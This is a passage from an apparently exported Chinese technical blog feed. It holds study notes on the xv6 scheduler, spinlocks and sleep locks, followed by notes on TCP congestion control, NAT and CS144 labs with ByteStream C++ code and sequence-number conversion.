%p, status: %d,     pid: %d\n&quot;</span>, p-&gt;name, p, p-&gt;lock.<span class="hljs-property">locked</span>, p-&gt;pid);<br><br>            <span class="hljs-keyword">if</span> (p-&gt;pid == <span class="hljs-number">3</span>) <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;======name: %s, addr: %p, status: %d, pid: %d\n&quot;</span>, p-&gt;name, p, p-&gt;lock.<span class="hljs-property">locked</span>, p-&gt;pid);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">strcmp</span>(p-&gt;name, <span class="hljs-string">&quot;spin&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;start %p, state: %d, pid: %d\n&quot;</span>, p, (proc + <span class="hljs-number">2</span>)-&gt;pid, p-&gt;pid);<br>            &#125;<br>      <span class="hljs-title function_">acquire</span>(&amp;p-&gt;lock);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">strcmp</span>(p-&gt;name, <span class="hljs-string">&quot;spin&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;startiii %d, stateiiii: %d\n&quot;</span>    , p-&gt;pid, p-&gt;lock.<span class="hljs-property">locked</span>);<br>      <span class="hljs-keyword">if</span>(p-&gt;state == <span class="hljs-variable constant_">RUNNABLE</span>) &#123;<br>        <span class="hljs-comment">// Switch to chosen process.  It is the process&#x27;s job</span><br>        <span class="hljs-comment">// to release its lock and then reacquire it</span><br>        <span class="hljs-comment">// before jumping back to us.</span><br>        p-&gt;state = <span class="hljs-variable constant_">RUNNING</span>;<br>        c-&gt;proc = p;<br>        <span class="hljs-title function_">swtch</span>(&amp;c-&gt;context, &amp;p-&gt;context);<br>    <br>        <span class="hljs-comment">// Process is done running for now.</span><br>        <span class="hljs-comment">// It should have changed its p-&gt;state before coming back.</span><br>        c-&gt;proc = <span class="hljs-number">0</span>;<br>      &#125;   <br>      <span class="hljs-title function_">release</span>(&amp;p-&gt;lock);<br>    &#125;   <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在scheduler函数中，因为我们已经停止了spin进程的运行，所以我们需要抹去对于spin进程的记录。我们接下来将c-&gt;proc设置为0（c-&gt;proc=0;）。因为我们现在并没有在这个CPU核上运行这个进程，为了不让任何人感到困惑，我们这里将CPU核运行的进程对象设置为0。</p><p><strong>之前在yield函数中获取了进程的锁，因为yield不想进程完全进入到Sleep状态之前，任何其他的CPU核的调度器线程看到这个进程并运行它。而现在我们完成了从spin进程切换走，所以现在可以释放锁了。</strong>这就是release(&amp;p-&gt;lock)的意义。现在，我们仍然在scheduler函数中，但是其他的CPU核可以找到spin进程，并且因为spin进程是RUNABLE状态，其他的CPU可以运行它。这没有问题，因为我们已经完整的保存了spin进程的寄存器，并且我们不在spin进程的栈上运行程序，而是在当前CPU核的调度器线程栈上运行程序，所以其他的CPU核运行spin程序并没有问题。但是因为启动QEMU时我们只指定了一个核，所以在我们现在的演示中并没有其他的CPU核来运行spin程序。</p><p><strong>p-&gt;lock这一条语句的重要性</strong></p><p>从调度的角度来说，这里的锁完成了两件事情：</p><p>首先，我们需要将进程的状态从RUNNING改成RUNABLE，我们需要将进程的寄存器保存在context对象中，并且我们还需要停止使用当前进程的栈。所以这里至少有三个步骤，而这三个步骤需要花费一些时间。<strong>所以锁的第一个工作就是在这三个步骤完成之前，阻止任何一个其他核的调度器线程看到当前进程。锁这里确保了三个步骤的原子性。从CPU核的角度来说，三个步骤要么全发生，要么全不发生。</strong></p><p>第二，当我们开始要运行一个进程时，p-&gt;lock也有类似的保护功能。当我们要运行一个进程时，我们需要将进程的状态设置为RUNNING，我们需要将进程的context移到RISC-V的寄存器中。<strong>但是，如果在这个过程中，发生了中断，从中断的角度来说进程将会处于一个奇怪的状态。比如说进程的状态是RUNNING，但是又还没有将所有的寄存器从context对象拷贝到RISC-V寄存器中。所以，如果这时候有了一个定时器中断将会是个灾难，因为我们可能在寄存器完全恢复之前，从这个进程中切换走。而从这个进程切换走的过程中，将会保存不完整的RISC-V寄存器到进程的context对象中。所以我们希望启动一个进程的过程也具有原子性</strong>。在这种情况下，切换到一个进程的过程中，也需要获取进程的锁以确保其他的CPU核不能看到这个进程。同时在切换到进程的过程中，<strong>还需要关闭中断，这样可以避免定时器中断看到还在切换过程中的进程</strong>。（注，这就是为什么468行需要加锁的原因）</p><p>现在我们在scheduler函数的循环中，代码会检查所有的进程并找到一个来运行。现在我们知道还有另一个进程，因为我们之前fork了另一个spin进程。这里我跳过进程检查，直接在找到RUNABLE进程的位置设置一个断点。</p><blockquote><p>学生提问：如果不是因为定时器中断发生的切换，我们是不是可以期望ra寄存器指向其他位置，例如sleep函数？</p><p>Robert教授：是的，我们之前看到了代码执行到这里会包含一些系统调用相关的函数。你基本上回答了自己的问题，如果我们因为定时器中断之外的原因而停止了执行当前的进程，switch会返回到一些系统调用的代码中，而不是我们这里看到sched函数。我记得sleep最后也调用了sched函数，虽然bracktrace可能看起来会不一样，但是还是会包含sched。所以我这里只介绍了一种进程间切换的方法，也就是因为定时器中断而发生切换。但是还有其他的可能会触发进程切换，例如等待I/O或者等待另一个进程向pipe写数据。</p></blockquote><p>这里有件事情需要注意，调度器线程调用了swtch函数，但是我们从swtch函数返回时，实际上是返回到了对于switch的另一个调用，而不是调度器线程中的调用。我们返回到的是pid为4的进程在很久之前对于switch的调用。这里可能会有点让人困惑，但是这就是线程切换的核心。</p><p>另一件需要注意的事情是，swtch函数是线程切换的核心，但是swtch函数中只有保存寄存器，再加载寄存器的操作。线程除了寄存器以外的还有很多其他状态，它有变量，堆中的数据等等，但是所有的这些数据都在内存中，并且会保持不变。我们没有改变线程的任何栈或者堆数据。所以线程切换的过程中，处理器中的寄存器是唯一的不稳定状态，且需要保存并恢复。而所有其他在内存中的数据会保存在内存中不被改变，所以不用特意保存并恢复。我们只是保存并恢复了处理器中的寄存器，因为我们想在新的线程中也使用相同的一组寄存器。</p><p><strong>xv6在当前cpu持有任何锁时，会关闭中断</strong></p><p>xv6使用自旋锁保护一些数据避免被线程和中断竞争访问以及可以做到同步。举个例子，时钟中断处理例程每隔一定时间会增加。lockticklock同步了两个过程：sleep和时钟中断，我们希望每次时钟中断后，再判断sleep是否到时间了。但是这会带来潜在的风险，如果sleep进程持有了锁，这样时钟中断就无法继续；反过来导致sleep无法继续计时从而释放锁，所以cpu就死锁了。为了避免这个问题，一种解决办法是如果一个自旋锁不能同时被中断处理程序和可能引起新中断的程序同时持有。xv6使用了比较保守的办法，当某个cpu持有任何锁的时候，就关闭该cpu所有中断。当然对于其他cpu没有影响，中断还是可能再其他cpu上发生的，所以cpu0上的中断可能获得cpu1上的进程释放的锁。</p><p>xv6在当前cpu没有任何自旋锁的时候，会re-enable中断。需要一些方式去识别cpu是否持有锁，xv6采用了这样一种机制，当进程加锁的时候，会调用push_off去跟踪锁的使用层级（类比页面栈），并在释放锁的时候pop_off，当计数为0的时候，说明cou不持有锁。intr_on和intr_off是开启和关闭中断的两个函数</p><p>t is important that acquire call push_off strictly before settinglk-&gt;locked (kernel/spinlock.c:28). If the two were reversed, therewould be a brief window when the lock was held with interrupts enabled,and an unfortunately timed interrupt would deadlock the system.Similarly, it is important that release call pop_off only afterreleasing the lock (kernel/spinlock.c:66).</p><p>进程切换时，会关闭中断</p><p>进程切换时加锁</p><p>文件操作时，会经常加锁，保证操作的原子性和缓存一致性，文件操作每次commit对应一个inode，也即对应一个buffer，log_write将该buffer（包含一条日志bloack，多少datablock？），也即对应一个文件。</p><h3 id="睡眠锁"><strong>睡眠锁</strong></h3><p>有时xv6需要长时间持有锁。例如文件系统在读写一个文件在硬盘上的内容的时候要保持它的锁，这样的磁盘操作可能需要几十个毫秒。那么长时间持有自旋锁将导致浪费，因为其它想获取这个锁的进程会长时间地等待。<strong>自旋锁的另一个缺点是当进程持有锁的时候不可以让出CPU，我们会希望持有锁的进程在等待磁盘的时候其它进程可以使用这个CPU。持有自旋锁的时候让出CPU是非法的，因为其它线程想获取这个自旋锁的时候会触发死锁；因为<code>acquire</code>不让出CPU，第二个线程的自旋可能会阻止第一个线程运行和释放锁。持有锁的时候让出CPU也违背了持有自旋锁的时候必须关闭中断这一规定。所以我们就需要有一种锁，当等待获取的时候让出CPU，且持有锁的时候也允许yield和中断。</strong></p><p>xv6提供了那样的锁，即<strong>睡眠锁</strong>。<code>acquiresleep</code>在等待的时候让出CPU，它使用的技术详见“调度”那一章。从较高的层面来看，睡眠锁有一个通过自旋锁保护的<code>locked</code>字段，<code>acquiresleep</code>调用<code>sleep</code>自动让出CPU并释放自旋锁。结果是<code>acquiresleep</code>等待的时候其它线程得以执行。</p><p>因为睡眠锁让中断打开了，它们不可以在中断处理例程中使用。因为<code>acquiresleep</code>可能让出CPU，睡眠锁不以在自旋锁的临界区内使用(但自旋锁可以在睡眠锁的临界区内使用)。</p><p>自旋锁适合于短的临界区，因为等待它们要浪费CPU时间；睡眠锁适合于长的操作。</p><blockquote><p><strong>看起来所有的CPU核要能完成线程切换都需要有一个定时器中断，那如果硬件定时器出现故障了怎么办？</strong></p><p>Robert教授：是的，总是需要有一个定时器中断。用户进程的pre-emptivescheduling能工作的原因是，用户进程运行时，中断总是打开的。XV6会确保返回到用户空间时，中断是打开的。这意味着当代码在用户空间执行时，定时器中断总是能发生。在内核中会更加复杂点，因为内核中偶尔会关闭中断，比如当获取锁的时候，中断会被关闭，只有当锁被释放之后中断才会重新打开，所以如果内核中有一些bug导致内核关闭中断之后再也没有打开中断，同时内核中的代码永远也不会释放CPU，那么定时器中断不会发生。但是因为XV6是我们写的，所以它总是会重新打开中断。XV6中的代码如果关闭了中断，它要么过会会重新打开中断，然后内核中定时器中断可以发生并且我们可以从这个内核线程切换走，要么代码会返回到用户空间。我们相信XV6中不会有关闭中断然后还死循环的代码。</p><p><strong>定时器中断是来自于某个硬件，如果硬件出现故障了呢？</strong></p><p>Robert教授：那你的电脑坏了，你要买个新电脑了。这个问题是可能发生的，因为电脑中有上亿的晶体管，有的时候电脑会有问题，但是这超出了内核的管理范围了。所以我们假设计算机可以正常工作。</p><p>有的时候软件会尝试弥补硬件的错误，比如通过网络传输packet，总是会带上checksum，这样如果某个网络设备故障导致某个bit反转了，可以通过checksum发现这个问题。但是对于计算机内部的问题，人们倾向于不用软件来尝试弥补硬件的错误。</p><p><strong>当一个线程结束执行了，比如说在用户空间通过exit系统调用结束线程，同时也会关闭进程的内核线程。那么线程结束之后和下一个定时器中断之间这段时间，CPU仍然会被这个线程占有吗？还是说我们在结束线程的时候会启动一个新的线程？</strong></p><p>Robert教授：exit系统调用会出让CPU。尽管我们这节课主要是基于定时器中断来讨论，但是实际上XV6切换线程的绝大部分场景都不是因为定时器中断，比如说一些系统调用在等待一些事件并决定让出CPU。exit系统调用会做各种操作然后调用yield函数来出让CPU，这里的出让并不依赖定时器中断。</p></blockquote><blockquote><p>操作系统都带了线程的实现，如果想要在多个CPU上运行一个进程内的多个线程，那需要通过操作系统来处理而不是用户空间代码，是吧？那这里的线程切换是怎么工作的？是每个线程都与进程一样了吗？操作系统还会遍历所有存在的线程吗？比如说我们有8个核，每个CPU核都会在多个进程的更多个线程之间切换。同时我们也不想只在一个CPU核上切换一个进程的多个线程，是吧？</p><p>Robert教授：Linux是支持一个进程包含多个线程，Linux的实现比较复杂，或许最简单的解释方式是：几乎可以认为Linux中的每个线程都是一个完整的进程。Linux中，我们平常说一个进程中的多个线程，本质上是共享同一块内存的多个独立进程。所以Linux中一个进程的多个线程仍然是通过一个内存地址空间执行代码。如果你在一个进程创建了2个线程，那基本上是2个进程共享一个地址空间。之后，调度就与XV6是一致的，也就是针对每个进程进行调度。</p><p>学生提问：用户可以指定将线程绑定在某个CPU上吗？操作系统如何确保一个进程的多个线程不会运行在同一个CPU核上？要不然就违背了多线程的初衷了。</p><p>Robert教授：这里其实与XV6非常相似，假设有4个CPU核，Linux会找到4件事情运行在这4个核上。如果并没有太多正在运行的程序的话，或许会将一个进程的4个线程运行在4个核上。或者如果有100个用户登录在Athena机器上，内核会随机为每个CPU核找到一些事情做。</p><p>如果你想做一些精细的测试，有一些方法可以将线程绑定在CPU核上，但正常情况下人们不会这么做。</p><p>学生提问：所以说一个进程中的多个线程会有相同的page table？</p><p>Robert教授：是的，如果你在Linux上，你为一个进程创建了2个线程，我不确定它们是不是共享同一个的pagetable，还是说它们是不同的page table，但是内容是相同的。</p><p>学生提问：当调用swtch函数的时候，实际上是从一个线程对于switch的调用切换到了另一个线程对于switch的调用。所以线程第一次调用swtch函数时，需要伪造一个“另一个线程”对于switch的调用，是吧？因为也不能通过swtch函数随机跳到其他代码去。</p><p>Robert教授：是的。我们来看一下第一次调用switch时，“另一个”调用swtch函数的线程的context对象。proc.c文件中的allocproc函数会被启动时的第一个进程和fork调用，allocproc会设置好新进程的context，如下所示</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU2NDgwMGEwODFjODkzOGM4NDAyNmE0NmVhODZmYThfTUNMbklGRzBnUXJGTUdwM3hpbTdQam45c2ZDYmxqSXJfVG9rZW46VnZDeGJuWklhb3oxbTh4SjVtRmNMUHBxbnVoXzE2OTY1NzQyMjc6MTY5NjU3NzgyN19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>实际上大部分寄存器的内容都无所谓。但是ra很重要，因为这是进程的第一个switch调用会返回的位置。同时因为进程需要有自己的栈，所以ra和sp都被设置了。这里设置的forkret函数就是进程的第一次调用swtch函数会切换到的“另一个”线程位置。</p><p>学生提问：所以当swtch函数返回时，CPU会执行forkret中的指令，就像forkret刚刚调用了swtch函数并且返回了一样？</p><p>Robert教授：是的，从switch返回就直接跳到了forkret的最开始位置。</p><p>学生提问：因吹斯听，我们会在其他场合调用forkret吗？还是说它只会用在这？</p><p>Robert教授：是的，它只会在启动进程的时候以这种奇怪的方式运行。下面是forkret函数的代码，</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVhMDBhZDQ0MzgwMTJkOGNlYmY4Y2Q4MTUxOWZkYzhfcGZXZzN4SjBHN3k5NjB0N3BUdXEyaTUyWER0SjBtR2VfVG9rZW46WlEyZ2JrSEtWb3A4WEp4a0w2NGNLSkZhbnFzXzE2OTY1NzQyMjc6MTY5NjU3NzgyN19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从代码中看，它的工作其实就是释放调度器之前获取的锁。函数最后的usertrapret函数其实也是一个假的函数，它会使得程序表现的看起来像是从trap中返回，但是对应的trapframe其实也是假的，这样才能跳到用户的第一个指令中。</p><p>学生提问：与之前的context对象类似的是，对于trapframe也不用初始化任何寄存器，因为我们要去的是程序的最开始，所以不需要做任何假设，对吧？</p><p>Robert教授：我认为程序计数器还是要被初始化为0的</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YzMwZjhhMWZkMWIxYTFkNzA5YjE3MmRjMGFlN2E0NTBfR01nOU8yQ1VLNDhHamVRSHlya09ibWdsVER3aGhpS3VfVG9rZW46Qnl3QWJMbWYwb0F4OGN4RUtmS2N3R0dsblp1XzE2OTY1NzQyMjc6MTY5NjU3NzgyN19WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>因为fork拷贝的进程会同时拷贝父进程的程序计数器，所以我们唯一不是通过fork创建进程的场景就是创建第一个进程的时候。这时需要设置程序计数器为0。</p><p>学生提问：在fortret函数中，if(first)是什么意思？</p><p>Robert教授：文件系统需要被初始化，具体来说，需要从磁盘读取一些数据来确保文件系统的运行，比如说文件系统究竟有多大，各种各样的东西在文件系统的哪个位置，同时还需要有crashrecoverylog。完成任何文件系统的操作都需要等待磁盘操作结束，但是XV6只能在进程的context下执行文件系统操作，比如等待I/O。所以初始化文件系统需要等到我们有了一个进程才能进行。而这一步是在第一次调用forkret时完成的，所以在forkret中才有了if(first)判断。</p></blockquote><h3 id="总结">总结</h3><ol type="1"><li>单个进程包含多个线程的os</li><li>队列于线程切换</li><li>如何避免死锁</li><li>并行是空间上的（对应多核），并发啥时间上的（对应同一个cpu的时间片轮转），都需要硬件支持，并发需要支持时钟中断，并行需要多核心。</li></ol>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网路五</title>
    <link href="/emocoder/2023/07/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF%E4%BA%94/"/>
    <url>/emocoder/2023/07/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h2 id="拥塞控制">拥塞控制</h2><p>什么是congestion control</p><p>网络流量在某段时间可能发生急剧地上升，这个时候网络交换机或者路由器的buffer没办法承受过大的流量，就会发生溢出，导致丢包，进而导致重传，更进一步加剧网络拥堵</p><p>所以需要一系列的策略（拥堵控制）来缓解这种情况，拥堵控制和前面所提到的流量控制有点类似，流量控制是为了网络流量超出了endpoint的承受范围；而拥堵控制是为了避免超出网络中的中间节点的承受范围。</p><h2 id="network-address-translation">Network Address Translation</h2><p>NAT（Network AddressTranslation，网络地址转换）是1994年提出的。当在专用网内部的一些主机本来已经分配到了本地IP地址（即仅在本专用网内使用的专用地址），但现在又想和因特网上的主机通信（并不需要加密）时，可使用NAT方法。</p><p>这种方法需要在专用网连接到因特网的路由器上安装NAT软件。装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球IP地址。这样，所有使用本地地址的主机在和外界通信时，都要在NAT路由器上将其本地地址转换成全球IP地址，才能和因特网连接。</p><p>NAT的功能：</p><p>NAT不仅能解决了lP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。把内网的私有地址，转化成外网的公有地址。使得内部网络上的（被设置为私有IP地址的）主机可以访问Internet。</p><p><ahref="https://zhuanlan.zhihu.com/p/26992935">网络地址转换协议NAT功能详解及NAT基础知识介绍- 知乎 (zhihu.com)</a></p><p>Lab 0</p><p>Lab 0：An in-memory reliable byte stream</p><p>By now, you’ve seen how the abstraction of a reliable byte stream canbe useful in communicating across the Internet, even though the Internetitself only provides the service of “best-effort” (unreliable)datagrams.</p><p>完成一个对象，这个对象提供了写接口和读接口，其存储结构是顺序的，其存储的字节流是有限的（当存储空间满了的时候，就不能再写了）；同样地，当存储空间为空的时候，意味着它到达了“EOF”</p><p>该对象初始化的提供一个参数——maximumsize，表示它的容量。本次作业是单线程的，不要考虑并发情况。</p><p>这里的存储虽然是有限的，但只是表示其同一时刻内存中的最大存储量，其本身还是可以接受任意大小的输入的，直到读到了输入的EOF或者结束了本次读取。</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230730120130298.png"alt="image-20230730120130298" /><figcaption aria-hidden="true">image-20230730120130298</figcaption></figure><p>以上是本次要实现的接口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++">ByteStream::<span class="hljs-built_in">ByteStream</span>( <span class="hljs-type">uint64_t</span> capacity ) : <span class="hljs-built_in">capacity_</span>( capacity ) &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Writer::push</span><span class="hljs-params">( <span class="hljs-type">const</span> std::string&amp; data )</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">/* Throw away the incoming data */</span><br>  <span class="hljs-keyword">if</span> ( error_ || <span class="hljs-built_in">is_closed</span>() || data.<span class="hljs-built_in">empty</span>() ) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">min</span>( data.<span class="hljs-built_in">length</span>(), <span class="hljs-built_in">available_capacity</span>() );<br>  queue_.<span class="hljs-built_in">append</span>( data.<span class="hljs-built_in">substr</span>( <span class="hljs-number">0</span>, len ) );<br>  pushed_len_ += len;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Writer::close</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  closed_ = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Writer::set_error</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  error_ = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Writer::is_closed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> closed_;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Writer::available_capacity</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> capacity_ - pushed_len_ + popped_len_;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Writer::bytes_pushed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> pushed_len_;<br>&#125;<br><br><span class="hljs-function">string_view <span class="hljs-title">Reader::peek</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> &#123; queue_ &#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Reader::is_finished</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> closed_ &amp;&amp; queue_.<span class="hljs-built_in">empty</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Reader::has_error</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> error_;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Reader::pop</span><span class="hljs-params">( <span class="hljs-type">uint64_t</span> len )</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> ( queue_.<span class="hljs-built_in">empty</span>() ) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  len = std::<span class="hljs-built_in">min</span>( len, queue_.<span class="hljs-built_in">size</span>() );<br>  queue_.<span class="hljs-built_in">erase</span>( queue_.<span class="hljs-built_in">begin</span>(), queue_.<span class="hljs-built_in">begin</span>() + <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;( len ) );<br>  popped_len_ += len;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Reader::bytes_buffered</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> pushed_len_ - popped_len_;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">Reader::bytes_popped</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> popped_len_;<br>&#125;<br></code></pre></td></tr></table></figure><p>Lab 1:stitching substrings into a byte stream</p><p>上一章节的作业实现了一个存储的数据结构，这个结构对于接收方来说是用于存放供上层应用读取的数据，然后供reassembler(本次要实现的对象)组装成有序的数据之后写入，相当于Stream提供了write接口供reassembler使用</p><figure><imgsrc="https://img-blog.csdnimg.cn/img_convert/e566dc480a570026637dd61455deb34e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对于Bytestream来说，其输入就是绿色部分的未重组的已缓存的字节流，当前时刻Bytestream最大容量位capacity，内存中已有的量为byted_pushed_- byted_poped_，ws（windowsize）为两者之差，超出的部分将会被直接丢弃，所以通信双方必须协商好ws</p><p>Lab2:</p><p>本次要实现的是TCP的接收方，主要是使用上一章使用的insert接口，以及进行相对序列号和绝对序列号的转换。</p><p>seqno：在TCP传输的TCPsegment中的标志每个字节的序列号，从ISN开始，32位。absoluteseqno：将seqno变为从0开始，64位。通过wrap和unwrap与seqno相互转换。streamindices：实际接受的字节流中每个字节的序列号，64位，即真正传输的数据的序列号（也就是我们在StreamReassembler中使用的索引，从0开始），FIN和SYN不占序列号</p><figure><imgsrc="https://img-blog.csdnimg.cn/img_convert/5adbb1688aaef0b322080de387236383.png"alt="image-20210818184635063" /><figcaption aria-hidden="true">image-20210818184635063</figcaption></figure><p>流重组器重组的子串每个字节都有一个 64位的<strong>流索引</strong>，流中的第一个字节的索引总是为0。一个 64位的索引足够大，我们认为它永远不会溢出。但实际上，在 TCP头部中，空间是非常宝贵的，流中每个字节的索引不是64位表示的，而是用32位的“序列号”或“seqno”表示的。</p><blockquote><ol type="1"><li><p>为什么TCP 序号是从一个随机值开始的</p><p>为了安全性，也为了避免被同一端点之间早期连接的旧的segments所混淆，TCP序列号从随机值开始，避免重复和被攻击者猜到。流中的第一个序列号是一个随机的32位数字，称为初始序列号(ISN)。这是代表SYN（流的起始）的序列号。后续字节的序号正常工作：(ISN + 1) mod 2^32、(ISN + 2) mod 2^32 ……</p></li><li><p>字节流的逻辑开始和结束各占据一个序列号，<strong>在 TCP中，SYN（流开始）和 FIN（流结束）控制标志被分配序列号</strong>。这些中的每一个都占用一个序列号（SYN标志占用的序列号就是ISN）</p></li></ol></blockquote><p>绝对序列号位数比较小，所以肯定出现循环，这样就会出现一个绝对序列号对多个相对序列号，比如绝对序列号15可能对15，2^32- 15, 2</p><p>64 =&gt; 32</p><p><code>static_cast&lt;uint32_t&gt;(this.raw_value_ - start_index) + isn</code></p><p>32 =&gt; 64</p><p>32转64需要有checkpoint的存在，否则不知道偏移量走了多少，因为32位会出现循环，基于isn做偏移量没有意义，</p><p>这样在相对序列号上的offset = this.raw_value_ - wrap32(checkpoint)</p><p>那么答案不就是？checkpoint +offset，注意这里可能出现负数，这说明在你相对序列号上出现了循环点跨越，这个时候计算的offset是不符合预期的，需要加上一个2^32抵消掉这部分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 